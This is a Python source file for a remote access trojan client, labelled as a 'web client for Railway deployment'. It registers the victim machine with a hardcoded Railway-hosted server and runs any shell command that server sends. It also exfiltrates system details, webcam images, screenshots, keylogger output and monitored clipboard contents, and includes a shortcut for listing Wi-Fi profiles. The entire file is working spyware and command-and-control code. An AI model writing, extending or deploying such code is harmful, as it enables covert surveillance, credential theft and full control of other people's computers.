#!/usr/bin/env python3
"""
Web-based client for Railway deployment
This client connects via HTTP instead of raw TCP sockets
"""

import requests
import json
import platform
import threading
import subprocess
import time
import psutil
import uuid
import os
import re
import base64
from urllib.parse import urljoin

# Try to import advanced features
try:
    import cv2
    import numpy as np
    from PIL import Image, ImageGrab
    from io import BytesIO
    ADVANCED_FEATURES = True
except ImportError:
    print("Advanced features not available. Install: pip install opencv-python pillow")
    ADVANCED_FEATURES = False

# Try to import clipboard and keylogging
try:
    import pyperclip
    CLIPBOARD_AVAILABLE = True
except ImportError:
    try:
        import win32clipboard
        import win32con
        CLIPBOARD_AVAILABLE = True
    except ImportError:
        print("Clipboard features not available. Install: pip install pyperclip")
        CLIPBOARD_AVAILABLE = False

try:
    from pynput import keyboard
    KEYLOGGER_AVAILABLE = True
except ImportError:
    print("Keylogger not available. Install: pip install pynput")
    KEYLOGGER_AVAILABLE = False

# Configuration
SERVER_URL = os.environ.get('SERVER_URL', 'https://pablo1-production.up.railway.app')
RECONNECT_DELAY = 10     # Seconds between reconnection attempts
HEARTBEAT_INTERVAL = 30  # Seconds between heartbeats

class WebClient:
    def __init__(self):
        self.client_id = f"{platform.node()}-{uuid.getnode()}"
        self.session_id = str(uuid.uuid4())
        self.running = True
        self.session = requests.Session()
        self.system_info = self.get_system_info()
        
        # Advanced features state
        self.keystrokes = []
        self.keylogger_listener = None
        self.keylogger_thread = None
        self.clipboard_monitoring = False
        self.clipboard_thread = None
        self.last_clipboard_content = None
        
        print(f"Web Client initialized with ID: {self.client_id}")
        print(f"Target Server: {SERVER_URL}")
        print(f"Advanced Features: {ADVANCED_FEATURES}")
        print(f"Keylogger Available: {KEYLOGGER_AVAILABLE}")
        print(f"Clipboard Available: {CLIPBOARD_AVAILABLE}")

    def get_system_info(self):
        """Collect detailed system information"""
        try:
            disks = []
            for part in psutil.disk_partitions(all=False):
                try:
                    usage = psutil.disk_usage(part.mountpoint)
                    disks.append({
                        "device": part.device,
                        "mountpoint": part.mountpoint,
                        "total_gb": round(usage.total / (1024**3)),
                        "used_gb": round(usage.used / (1024**3)),
                        "free_gb": round(usage.free / (1024**3))
                    })
                except:
                    continue
            
            return {
                "basic": {
                    "hostname": platform.node(),
                    "os": platform.system(),
                    "os_version": platform.version(),
                    "architecture": platform.machine(),
                    "processor": platform.processor(),
                    "python_version": platform.python_version()
                },
                "resources": {
                    "cpu_cores": psutil.cpu_count(),
                    "total_ram": round(psutil.virtual_memory().total / (1024**3)),
                    "disks": disks
                },
                "network": {
                    "mac_address": ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,8*6,8)][::-1]),
                    "ip_address": "Web Client"  # Can't determine real IP from client side
                },
                "session": {
                    "client_id": self.client_id,
                    "session_id": self.session_id,
                    "connection_type": "HTTP",
                    "process_id": os.getpid()
                }
            }
        except Exception as e:
            print(f"Error collecting system info: {e}")
            return {"error": str(e)}

    def execute_command(self, command):
        """Execute system command with special command handling"""
        try:
            print(f"Executing command: {command}")
            
            # Handle special commands first
            if command == "capture_webcam":
                return self.capture_webcam()
            elif command == "capture_screenshot":
                return self.capture_screenshot()
            elif command == "keylog_start":
                return self.start_keylogger()
            elif command == "keylog_stop":
                return self.stop_keylogger()
            elif command == "clipboard_start":
                return self.start_clipboard_monitoring()
            elif command == "clipboard_stop":
                return self.stop_clipboard_monitoring()
            elif command == "clipboard_get":
                return self.get_clipboard_content()
            
            # Handle mapped system commands
            command_mappings = {
                "shutdown": "shutdown /s /t 0",
                "open_cmd": "start cmd",
                "open_cmd_admin": "start runas /user:Administrator cmd.exe",
                "open_calculator": "calc.exe",
                "open_notepad": "notepad.exe",
                "get_owner": "net user %USERNAME%",
                "tasklist": "tasklist",
                "get_wifi_passwords": "netsh wlan show profiles"
            }
            
            # Use mapped command if available, otherwise use original
            actual_command = command_mappings.get(command, command)
            
            result = subprocess.run(
                actual_command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                timeout=30,
                encoding='utf-8',
                errors='replace'
            )
            
            if result.returncode == 0:
                output = result.stdout.strip() or "Command executed successfully"
                print(f"Command success: {len(output)} characters")
                return output
            else:
                error = f"ERROR ({result.returncode}): {result.stderr.strip()}"
                print(f"Command error: {error}")
                return error
                
        except subprocess.TimeoutExpired:
            print("Command timed out")
            return "ERROR: Command timed out after 30 seconds"
        except Exception as e:
            print(f"Command execution error: {e}")
            return f"ERROR: {str(e)}"

    def capture_webcam(self):
        """Capture an image from the webcam"""
        if not ADVANCED_FEATURES:
            return "ERROR: Webcam features not available. Install: pip install opencv-python"
            
        try:
            # Initialize webcam
            cap = cv2.VideoCapture(0)
            
            if not cap.isOpened():
                return "ERROR: Could not access webcam"
                
            # Wait a moment for the camera to initialize
            time.sleep(1)
            
            # Capture a frame
            ret, frame = cap.read()
            
            # Release the webcam
            cap.release()
            
            if not ret:
                return "ERROR: Failed to capture image"
                
            # Convert the image to JPEG format
            _, buffer = cv2.imencode('.jpg', frame)
            jpg_as_text = base64.b64encode(buffer).decode('utf-8')
            
            print("Webcam image captured successfully")
            return {
                "message": "Webcam image captured successfully",
                "image_data": jpg_as_text
            }
            
        except Exception as e:
            print(f"Webcam capture error: {e}")
            return f"ERROR: {str(e)}"
            
    def capture_screenshot(self):
        """Capture a screenshot of the client's screen"""
        if not ADVANCED_FEATURES:
            return "ERROR: Screenshot features not available. Install: pip install pillow"
            
        try:
            # Capture the screen
            screenshot = ImageGrab.grab()
            
            # Convert to a format we can send
            buffer = BytesIO()
            screenshot.save(buffer, format="JPEG", quality=70)
            buffer.seek(0)
            
            # Convert to base64
            img_base64 = base64.b64encode(buffer.getvalue()).decode('utf-8')
            
            print("Screenshot captured successfully")
            return {
                "message": "Screenshot captured successfully",
                "image_data": img_base64
            }
            
        except Exception as e:
            print(f"Screenshot capture error: {e}")
            return f"ERROR: {str(e)}"
            
    def start_keylogger(self):
        """Start capturing keystrokes"""
        if not KEYLOGGER_AVAILABLE:
            return "ERROR: Keylogger not available. Install: pip install pynput"
            
        try:
            if self.keylogger_listener:
                return "Keylogger already running"

            def on_press(key):
                try:
                    self.keystrokes.append(str(key))
                except:
                    pass
            
            self.keylogger_listener = keyboard.Listener(on_press=on_press)
            self.keylogger_listener.start()
            self.keylogger_thread = threading.Thread(target=self.send_keylog_data, daemon=True)
            self.keylogger_thread.start()
            print("Keylogger started")
            return "Keylogger started successfully"
        except Exception as e:
            print(f"Keylogger start error: {e}")
            return f"ERROR: {str(e)}"

    def stop_keylogger(self):
        """Stop capturing keystrokes"""
        try:
            if self.keylogger_listener:
                self.keylogger_listener.stop()
                self.keylogger_listener = None
                self.keylogger_thread = None
                self.keystrokes = []
                print("Keylogger stopped")
                return "Keylogger stopped successfully"
            return "Keylogger not running"
        except Exception as e:
            print(f"Keylogger stop error: {e}")
            return f"ERROR: {str(e)}"
            
    def send_keylog_data(self):
        """Periodically send captured keystrokes to the server"""
        while self.running and self.keylogger_listener:
            if self.keystrokes:
                try:
                    keylog_data = " ".join(self.keystrokes)
                    # Send keylog data to server
                    url = urljoin(SERVER_URL, '/api/keylog_data')
                    data = {
                        'client_id': self.client_id,
                        'keylog_data': keylog_data
                    }
                    
                    response = self.session.post(url, json=data, timeout=5)
                    if response.status_code == 200:
                        print(f"Sent keylog data: {keylog_data[:50]}..." if len(keylog_data) > 50 else f"Sent keylog data: {keylog_data}")
                    self.keystrokes = []
                except Exception as e:
                    print(f"Error sending keylog data: {e}")
            time.sleep(5)  # Send keylog data every 5 seconds
            
    def get_clipboard_content(self):
        """Get the current clipboard content"""
        if not CLIPBOARD_AVAILABLE:
            return "ERROR: Clipboard features not available. Install: pip install pyperclip"
            
        try:
            clipboard_text = ""
            
            # Try to use pyperclip first
            try:
                import pyperclip
                clipboard_text = pyperclip.paste()
            except:
                # Fall back to win32clipboard on Windows
                try:
                    import win32clipboard
                    import win32con
                    
                    win32clipboard.OpenClipboard()
                    try:
                        if win32clipboard.IsClipboardFormatAvailable(win32con.CF_TEXT):
                            clipboard_text = win32clipboard.GetClipboardData(win32con.CF_TEXT).decode('utf-8', errors='replace')
                        elif win32clipboard.IsClipboardFormatAvailable(win32con.CF_UNICODETEXT):
                            clipboard_text = win32clipboard.GetClipboardData(win32con.CF_UNICODETEXT)
                    finally:
                        win32clipboard.CloseClipboard()
                except:
                    return "ERROR: Failed to access clipboard"
            
            if not clipboard_text:
                return "Clipboard is empty or contains non-text data"
                
            return clipboard_text
            
        except Exception as e:
            print(f"Clipboard access error: {e}")
            return f"ERROR: {str(e)}"
            
    def start_clipboard_monitoring(self):
        """Start monitoring the clipboard for changes"""
        if not CLIPBOARD_AVAILABLE:
            return "ERROR: Clipboard features not available. Install: pip install pyperclip"
            
        if self.clipboard_monitoring:
            return "Clipboard monitoring is already running"
            
        try:
            self.last_clipboard_content = self.get_clipboard_content()
            if isinstance(self.last_clipboard_content, str) and self.last_clipboard_content.startswith("ERROR:"):
                return self.last_clipboard_content
                
            self.clipboard_monitoring = True
            self.clipboard_thread = threading.Thread(target=self.monitor_clipboard, daemon=True)
            self.clipboard_thread.start()
            
            print("Clipboard monitoring started")
            return "Clipboard monitoring started successfully"
            
        except Exception as e:
            print(f"Clipboard monitoring start error: {e}")
            return f"ERROR: {str(e)}"
            
    def stop_clipboard_monitoring(self):
        """Stop monitoring the clipboard"""
        if not self.clipboard_monitoring:
            return "Clipboard monitoring is not running"
            
        try:
            self.clipboard_monitoring = False
            self.clipboard_thread = None
            self.last_clipboard_content = None
            
            print("Clipboard monitoring stopped")
            return "Clipboard monitoring stopped successfully"
            
        except Exception as e:
            print(f"Clipboard monitoring stop error: {e}")
            return f"ERROR: {str(e)}"
            
    def monitor_clipboard(self):
        """Monitor clipboard for changes and send updates"""
        print("Clipboard monitoring thread started")
        
        while self.running and self.clipboard_monitoring:
            try:
                current_content = self.get_clipboard_content()
                
                if isinstance(current_content, str) and not current_content.startswith("ERROR:"):
                    if current_content != self.last_clipboard_content and current_content != "Clipboard is empty or contains non-text data":
                        print("Clipboard content changed")
                        
                        self.last_clipboard_content = current_content
                        
                        # Send clipboard update to server
                        try:
                            url = urljoin(SERVER_URL, '/api/clipboard_data')
                            data = {
                                'client_id': self.client_id,
                                'clipboard_data': current_content[:10000],  # Limit size
                                'timestamp': time.time()
                            }
                            
                            response = self.session.post(url, json=data, timeout=5)
                            if response.status_code == 200:
                                print("Sent clipboard update")
                        except Exception as e:
                            print(f"Error sending clipboard update: {e}")
                
            except Exception as e:
                print(f"Clipboard monitoring error: {e}")
                
            time.sleep(1)  # Check every second

    def register_client(self):
        """Register this client with the server"""
        try:
            url = urljoin(SERVER_URL, '/api/register_client')
            data = {
                'client_id': self.client_id,
                'system_info': self.system_info,
                'connection_type': 'web'
            }
            
            response = self.session.post(url, json=data, timeout=10)
            if response.status_code == 200:
                print("Successfully registered with server")
                return True
            else:
                print(f"Failed to register: {response.status_code}")
                return False
        except Exception as e:
            print(f"Registration error: {e}")
            return False

    def poll_commands(self):
        """Poll for commands from the server"""
        try:
            url = urljoin(SERVER_URL, f'/api/get_commands/{self.client_id}')
            response = self.session.get(url, timeout=5)
            
            if response.status_code == 200:
                data = response.json()
                commands = data.get('commands', [])
                
                for command_data in commands:
                    command = command_data.get('command')
                    command_id = command_data.get('command_id')
                    
                    if command:
                        print(f"Received command: {command}")
                        result = self.execute_command(command)
                        self.send_result(command_id, command, result)
                        
            elif response.status_code == 404:
                # Client not found, try to re-register
                print("Client not found on server, re-registering...")
                self.register_client()
                
        except Exception as e:
            print(f"Polling error: {e}")

    def send_result(self, command_id, command, result):
        """Send command result back to server"""
        try:
            url = urljoin(SERVER_URL, '/api/command_result')
            
            # Handle special result types (webcam/screenshot with image data)
            if isinstance(result, dict) and 'image_data' in result:
                # Send image data separately
                image_url = urljoin(SERVER_URL, '/api/image_data')
                image_data = {
                    'client_id': self.client_id,
                    'command_id': command_id,
                    'command': command,
                    'image_data': result['image_data'],
                    'message': result['message']
                }
                
                # Send image data
                img_response = self.session.post(image_url, json=image_data, timeout=30)
                if img_response.status_code == 200:
                    print(f"Successfully sent image data for command: {command}")
                else:
                    print(f"Failed to send image data: {img_response.status_code}")
                
                # Send regular result
                data = {
                    'client_id': self.client_id,
                    'command_id': command_id,
                    'command': command,
                    'result': result['message']
                }
            else:
                # Regular result
                data = {
                    'client_id': self.client_id,
                    'command_id': command_id,
                    'command': command,
                    'result': result
                }
            
            response = self.session.post(url, json=data, timeout=10)
            if response.status_code == 200:
                print(f"Successfully sent result for command: {command}")
            else:
                print(f"Failed to send result: {response.status_code}")
                
        except Exception as e:
            print(f"Error sending result: {e}")

    def send_heartbeat(self):
        """Send periodic heartbeat to server"""
        while self.running:
            try:
                url = urljoin(SERVER_URL, '/api/heartbeat')
                data = {
                    'client_id': self.client_id,
                    'status': 'active',
                    'timestamp': time.time()
                }
                
                response = self.session.post(url, json=data, timeout=5)
                if response.status_code == 200:
                    print("Heartbeat sent")
                else:
                    print(f"Heartbeat failed: {response.status_code}")
                    
            except Exception as e:
                print(f"Heartbeat error: {e}")
                
            time.sleep(HEARTBEAT_INTERVAL)

    def start(self):
        """Start the web client"""
        print("Starting web client...")
        print(f"Connecting to: {SERVER_URL}")
        
        # Start heartbeat thread
        heartbeat_thread = threading.Thread(target=self.send_heartbeat, daemon=True)
        heartbeat_thread.start()
        
        while self.running:
            try:
                # Try to register/connect
                if self.register_client():
                    print("Connected to server successfully!")
                    
                    # Main polling loop
                    while self.running:
                        self.poll_commands()
                        time.sleep(2)  # Poll every 2 seconds
                        
                else:
                    print(f"Failed to connect, retrying in {RECONNECT_DELAY} seconds...")
                    time.sleep(RECONNECT_DELAY)
                    
            except KeyboardInterrupt:
                print("Shutting down client...")
                self.running = False
            except Exception as e:
                print(f"Connection error: {e}")
                print(f"Retrying in {RECONNECT_DELAY} seconds...")
                time.sleep(RECONNECT_DELAY)

if __name__ == "__main__":
    # For Railway deployment, set the server URL
    if 'railway.app' in SERVER_URL or 'render.com' in SERVER_URL:
        print("Web client mode - using HTTP API instead of TCP")
    
    client = WebClient()
    try:
        client.start()
    except KeyboardInterrupt:
        print("Client stopped by user")
    except Exception as e:
        print(f"Client error: {e}")